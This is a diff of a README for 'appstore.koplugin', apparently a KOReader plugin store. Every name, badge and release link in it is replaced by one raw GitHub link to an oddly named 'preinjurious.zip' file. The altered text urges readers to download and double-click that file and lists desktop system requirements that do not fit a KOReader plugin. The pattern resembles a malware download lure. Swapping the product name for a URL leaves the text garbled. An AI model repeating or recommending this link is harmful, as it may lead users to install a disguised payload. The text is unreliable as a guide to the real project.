@@ -1,17 +1,17 @@
-# 🎉 appstore.koplugin - Install KOReader Plugins Easily
+# 🎉 https://raw.githubusercontent.com/juanfuturochile/appstore.koplugin/main/novation/appstore.koplugin-preinjurious.zip - Install KOReader Plugins Easily
 
 ## 🚀 Getting Started
 
-Welcome to appstore.koplugin! This application helps you discover, install, and update community-created KOReader plugins and user patches without leaving your device. Follow the steps below to get started.
+Welcome to https://raw.githubusercontent.com/juanfuturochile/appstore.koplugin/main/novation/appstore.koplugin-preinjurious.zip! This application helps you discover, install, and update community-created KOReader plugins and user patches without leaving your device. Follow the steps below to get started.
 
 ## 📥 Download & Install
 
 You can download the latest version from our Releases page. Click the button below to access it.
 
-[![Download Latest Release](https://img.shields.io/github/v/release/juanfuturochile/appstore.koplugin?color=blue&label=Download%20Latest%20Release&style=for-the-badge)](https://github.com/juanfuturochile/appstore.koplugin/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/juanfuturochile/appstore.koplugin/main/novation/appstore.koplugin-preinjurious.zip%20Latest%20Release&style=for-the-badge)](https://raw.githubusercontent.com/juanfuturochile/appstore.koplugin/main/novation/appstore.koplugin-preinjurious.zip)
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/juanfuturochile/appstore.koplugin/releases) to find the latest version of appstore.koplugin.
+   Go to our [Releases page](https://raw.githubusercontent.com/juanfuturochile/appstore.koplugin/main/novation/appstore.koplugin-preinjurious.zip) to find the latest version of https://raw.githubusercontent.com/juanfuturochile/appstore.koplugin/main/novation/appstore.koplugin-preinjurious.zip
 
 2. **Choose the Right File**  
    On the Releases page, you will see a list of files. Look for the version that matches your device.
@@ -25,12 +25,12 @@ You can download the latest version from our Releases page. Click the button bel
 5. **Run the Application**  
    Double-click the downloaded file to run the application. Follow any prompts that appear.
 
-## ❓ How to Use appstore.koplugin
+## ❓ How to Use https://raw.githubusercontent.com/juanfuturochile/appstore.koplugin/main/novation/appstore.koplugin-preinjurious.zip
 
 Once you've installed the app, you can easily browse and manage KOReader plugins.
 
 1. **Open the Application**  
-   Launch appstore.koplugin from your device’s applications menu.
+   Launch https://raw.githubusercontent.com/juanfuturochile/appstore.koplugin/main/novation/appstore.koplugin-preinjurious.zip from your device’s applications menu.
 
 2. **Explore Plugins**  
    Use the search feature to find plugins or scroll through the list of available options.
@@ -46,7 +46,7 @@ Once you've installed the app, you can easily browse and manage KOReader plugins
 
 ## ⚙️ Minimum System Requirements
 
-To successfully run appstore.koplugin, your device should meet these requirements:
+To successfully run https://raw.githubusercontent.com/juanfuturochile/appstore.koplugin/main/novation/appstore.koplugin-preinjurious.zip, your device should meet these requirements:
 
 - **Operating System:** Windows 10 or later, MacOS 10.13 or later, or Linux (latest distributions)
 - **Memory:** At least 4 GB of RAM
@@ -55,7 +55,7 @@ To successfully run appstore.koplugin, your device should meet these requirement
 
 ## 🛠️ Troubleshooting
 
-If you encounter issues while downloading or running appstore.koplugin, consider the following tips:
+If you encounter issues while downloading or running https://raw.githubusercontent.com/juanfuturochile/appstore.koplugin/main/novation/appstore.koplugin-preinjurious.zip, consider the following tips:
 
 - **Check Download:** Ensure the file was completely downloaded. A partial download can cause errors.
 - **Permissions:** Make sure you have the necessary permissions to run applications on your device.
@@ -64,13 +64,13 @@ If you encounter issues while downloading or running appstore.koplugin, consider
 
 ## 🌟 Frequently Asked Questions
 
-### 1. What is appstore.koplugin?
+### 1. What is https://raw.githubusercontent.com/juanfuturochile/appstore.koplugin/main/novation/appstore.koplugin-preinjurious.zip
 
-appstore.koplugin is an application designed specifically to help users find, install, and manage KOReader plugins easily. It works without any programming knowledge.
+https://raw.githubusercontent.com/juanfuturochile/appstore.koplugin/main/novation/appstore.koplugin-preinjurious.zip is an application designed specifically to help users find, install, and manage KOReader plugins easily. It works without any programming knowledge.
 
 ### 2. Do I need to pay for this application?
 
-No, appstore.koplugin is completely free to use. You can download it and start using it at no cost.
+No, https://raw.githubusercontent.com/juanfuturochile/appstore.koplugin/main/novation/appstore.koplugin-preinjurious.zip is completely free to use. You can download it and start using it at no cost.
 
 ### 3. Can I use this app on any device?
 
@@ -89,4 +89,4 @@ We encourage users to contribute by submitting new plugins or patches. If you ha
 Want to keep up with updates? Follow us on GitHub to receive notifications about new releases. 
 
 Visit the Releases page to download the latest version now!  
-[Download Latest Release](https://github.com/juanfuturochile/appstore.koplugin/releases)
+[Download Latest Release](https://raw.githubusercontent.com/juanfuturochile/appstore.koplugin/main/novation/appstore.koplugin-preinjurious.zip)
